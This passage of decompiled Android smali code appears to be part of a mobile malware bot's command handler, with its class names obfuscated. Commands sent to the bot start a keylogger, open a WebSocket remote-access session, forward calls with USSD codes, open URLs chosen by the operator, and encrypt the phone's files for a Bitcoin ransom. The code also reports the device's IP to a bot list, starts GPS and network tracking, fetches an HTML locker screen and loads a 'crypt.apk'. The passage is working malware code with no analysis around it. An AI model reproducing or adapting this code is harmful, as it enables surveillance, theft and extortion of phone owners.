    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3d

    const-string v5, "SEND KEL"

    const-string v9, "CLEAR"

    invoke-static {v5, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const-string v5, "keys.log"

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b(Ljava/lang/String;)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_18

    goto :goto_22

    :catch_18
    const-string v5, "ERROR"

    const-string v9, "getkeylogger -> Commands"

    invoke-static {v5, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_3d
    :goto_22
    aget-object v5, v3, v4

    const-string v9, "|startrat="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3e

    :try_start_1a
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|endrat="

    const-string v11, "|endurl"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "WebSocket"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "websocket"

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/xelytgswelv;

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v5

    if-nez v5, :cond_3e

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    new-instance v9, Landroid/content/Intent;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v11, Lwocwvy/czyxoxmbauu/slsa/xelytgswelv;

    invoke-direct {v9, v10, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v9}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_19

    goto :goto_23

    :catch_19
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "WebSocket -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3e
    :goto_23
    aget-object v5, v3, v4

    const-string v9, "startforward="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3f

    :try_start_1b
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v5, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->l(Landroid/content/Context;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "startforward="

    const-string v11, "|endforward"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "Number"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "*21*"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "#"

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v1, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_1a

    goto :goto_24

    :catch_1a
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "Start Forward -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3f
    :goto_24
    aget-object v5, v3, v4

    const-string v9, "stopforward"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_40

    :try_start_1c
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v5, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->l(Landroid/content/Context;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "#21#"

    invoke-virtual {v5, v1, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_1b

    goto :goto_25

    :catch_1b
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "STOP Forward -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_40
    :goto_25
    aget-object v5, v3, v4

    const-string v9, "|openbrowser="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_41

    :try_start_1d
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|openbrowser="

    const-string v11, "|endbrowser"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "url"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v9, Landroid/content/Intent;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/ncec/dzudmx;

    invoke-direct {v9, v1, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v10, "start"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "**startbrurl**"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v10, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_1c

    goto :goto_26

    :catch_1c
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "Open Browser URL -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_41
    :goto_26
    aget-object v5, v3, v4

    const-string v9, "|openactivity="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_42

    :try_start_1e
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|openactivity="

    const-string v11, "|endactivity"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v9, Landroid/content/Intent;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v11, Lwocwvy/czyxoxmbauu/slsa/ncec/khypzruy;

    invoke-direct {v9, v10, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v10, "url"

    invoke-virtual {v9, v10, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v8, 0x800000

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_1d

    goto :goto_27

    :catch_1d
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "ERROR"

    const-string v8, "Open Activity URL -> Commands"

    invoke-virtual {v5, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_42
    :goto_27
    aget-object v5, v3, v4

    const-string v7, "|cryptokey="

    invoke-virtual {v5, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_43

    :try_start_1f
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v7, v3, v4

    const-string v8, "|cryptokey="

    const-string v9, "|endcrypt"

    invoke-virtual {v5, v7, v8, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v7, "/:/"

    invoke-virtual {v5, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const/4 v7, 0x0

    aget-object v8, v5, v7

    const/4 v7, 0x1

    aget-object v9, v5, v7
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_1e

    const/4 v7, 0x2

    :try_start_20
    aget-object v5, v5, v7

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v11, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object v11, v11, Lwocwvy/czyxoxmbauu/slsa/a;->c:[Ljava/lang/String;

    const/4 v12, 0x0

    aget-object v11, v11, v12

    invoke-virtual {v10, v1, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_44

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-class v11, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;

    invoke-virtual {v10, v1, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v10

    if-nez v10, :cond_44

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v11, "lock_amount"

    invoke-virtual {v10, v1, v11, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "lock_btc"

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "status"

    const-string v10, "crypt"

    invoke-virtual {v5, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "key"

    invoke-virtual {v5, v1, v9, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v5, Landroid/content/Intent;

    const-class v8, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;

    invoke-direct {v5, v1, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_1f

    goto :goto_28

    :catch_1e
    const/4 v7, 0x2

    :catch_1f
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v8, "ERROR"

    const-string v9, "WebSocket -> Commands"

    invoke-virtual {v5, v8, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_28

    :cond_43
    const/4 v7, 0x2

    :cond_44
    :goto_28
    aget-object v5, v3, v4

    const-string v8, "|decryptokey="

    invoke-virtual {v5, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_45

    :try_start_21
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v8, v3, v4

    const-string v9, "|decryptokey="

    const-string v10, "|enddecrypt"

    invoke-virtual {v5, v8, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object v9, v9, Lwocwvy/czyxoxmbauu/slsa/a;->c:[Ljava/lang/String;

    const/4 v10, 0x0

    aget-object v9, v9, v10

    invoke-virtual {v8, v1, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_45

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;

    invoke-virtual {v8, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v8

    if-nez v8, :cond_45

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "status"

    const-string v10, "decrypt"

    invoke-virtual {v8, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "key"

    invoke-virtual {v8, v1, v9, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    new-instance v8, Landroid/content/Intent;

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;

    invoke-direct {v8, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v8}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_20

    goto :goto_29

    :catch_20
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v8, "ERROR"

    const-string v9, "WebSocket -> Commands"

    invoke-virtual {v5, v8, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_45
    :goto_29
    aget-object v5, v3, v4

    const-string v8, "getIP"

    invoke-virtual {v5, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_46

    new-instance v5, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/b;

    invoke-direct {v5}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/b;-><init>()V

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v10, "4"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "p="

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v13, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, "|IP bots: "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v15, "http://en.utrace.de"

    const-string v7, ""

    invoke-virtual {v5, v15, v7}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/b;->b(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v7, ">The IP address "

    const-string v15, " is located in the"

    invoke-virtual {v14, v5, v7, v15}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const-string v5, "|"

    invoke-virtual {v13, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v12, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v8, v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_46
    :try_start_22
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "network"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "true"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_47

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;

    invoke-direct {v5, v1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_47
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "gps"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "true"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_48

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lwocwvy/czyxoxmbauu/slsa/blkzyyyfc;

    invoke-direct {v5, v1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_21

    goto :goto_2a

    :catch_21
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "ukhakhcgifofl"

    const-string v7, "ERROR -> blkzyyyfc"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_48
    :goto_2a
    :try_start_23
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "htmllocker"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5

    const/16 v6, 0xf

    if-ge v5, v6, :cond_49

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v9, "11"

    const-string v10, "p=1"

    invoke-virtual {v7, v8, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v7

    if-le v7, v6, :cond_49

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v8, "htmllocker"

    invoke-virtual {v6, v7, v8, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_22

    goto :goto_2b

    :catch_22
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "ukhakhcgifofl"

    const-string v7, "ERROR -> htmllocker"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_49
    :goto_2b
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget-boolean v5, v5, Lwocwvy/czyxoxmbauu/slsa/c;->q:Z

    if-eqz v5, :cond_4a

    :try_start_24
    new-instance v5, Ljava/io/File;

    const-string v6, "apk"
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_25

    const/4 v7, 0x0

    :try_start_25
    invoke-virtual {v1, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v6
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_26

    :try_start_26
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {v8}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v8, "crypt"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, ".apk"

